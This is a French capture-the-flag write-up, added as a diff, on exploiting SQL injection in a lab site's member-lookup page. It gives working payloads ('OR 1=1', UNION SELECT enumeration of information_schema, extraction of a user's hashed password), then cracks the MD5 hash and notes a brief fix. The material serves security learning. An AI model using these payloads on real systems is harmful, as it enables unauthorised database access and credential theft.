@@ -1,0 +1,96 @@
+-LOCALISATION:
+	http://192.168.56.101/index.php?page=member	
+
+-Contexte:
+	On a un champ de texte qui attend un id afin d'afficher les données du user
+	correspondant. (ID, First name et Surname)
+
+-Description:
+
+En y tapant un caractère spécial, le site nous affichera une erreur SQL, ce qui
+nous prouve que le champ de texte est vulnérable aux injections SQL.
+
+Etant donné que le champ attend en temps normal un caractère numérique (un id), afin de
+retourner l'ID, le first name et le surname d'un utilisateur, on peut en déduire
+que le serveur effectue la requête SQL suivante :
+
+	SELECT first_name, surname FROM [table] WHERE ID = '[valeur de l'input]';
+
+Dans ce cas, il suffit de spécifier n'importe quel identifiant (pour l'exemple,
+nous utiliserons -1) suivi de l'instruction "OR 1=1" (donc true) pour
+que la requête SQL soit valide pour chacune des entrées de la table. Nous entrons
+donc :
+
+	-1 OR 1=1
+
+Parmis les utilisateurs retournés, nous obtenons celui-ci :
+
+	ID: -1 OR 1=1 First name: Flag Surname : GetThe
+
+Il va donc falloir obtenir d'autres informations concernant ce user, et plus
+globalement sur la manière dont sont stockées les données de la DB. Pour cela,
+nous pouvons simplement ajouter d'autres instructions à notre injection grâce au
+mot-clé "UNION". Nous pouvons donc injecter le code suivant :
+
+	-1 UNION SELECT table_name, NULL FROM information_schema.tables;
+
+"information_schema" est une table qui contient d'autres tables afin de stocker
+les informations de la DB. Nous accédons à la table "tables" qui contenant les
+infos des autres tables de la db.
+
+"table_name" est une colonne de la table "tables". Elle stocke les noms des tables
+
+Nous ajoutons ", NULL" car la requête prévoit de retourner les résultats de 2
+colonnes (initialement first_name et surname, que nous remplaçons donc par
+table_name et NULL (pour le moment)).
+
+Parmis les noms de tables retournés, nous trouvons la table "users". Nous devons
+désormais trouver comment est organisée cette table. Pour ça, nous allons
+récupérer les noms de colonnes existantes de la db, et vérifier lesquelles
+appartiennent à la table "users" avec l'instruction suivante :
+
+	-1 UNION SELECT table_name, column_name FROM information_schema.columns
+
+CTRL + F pour chercher "users" dans les résultats et nous obtenons ceci :
+
+	Surname : user_id
+	Surname : first_name
+	Surname : last_name
+	Surname : town
+	Surname : country
+	Surname : planet
+	Surname : Commentaire
+	Surname : countersign
+
+(il y a sûrement une commande pour se passer du CTRL + F)
+
+Nous savons maintenant qu'un user possède ces données. Nous n'avons plus qu'à les
+consulter pour notre fameux "GetThe" "Flag" du début, en commençant par obtenir
+son id.
+
+	-1 UNION SELECT user_id, first_name FROM users --->>>
+
+	ID: -1 UNION SELECT user_id, first_name FROM users 
+	First name: 5
+	Surname : Flag
+
+Puis :
+
+	5 UNION SELECT town, country FROM users
+	5 UNION SELECT planet, Commentaire FROM users
+	5 UNION SELECT countersign, NULL FROM users
+
+	--->>>
+
+	town : 42
+	country : 42
+	planet : 42
+	Commentaire : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+	countersign : 5ff9d0165b4f92b14994e5c685cdce28
+
+Le code contenu dans le countersign est chiffré en MD5. Après déchiffrement, nous
+obtenons "FortyTwo". On le met en minuscules puis on l'encode en Sh256, ce qui
+nous donne le flag.
+
+Comment resoudre:
+	Il faut preparer a l'avance les requetes SQL faites au serveur, et nettoyer les donnees du user avant de les injecter
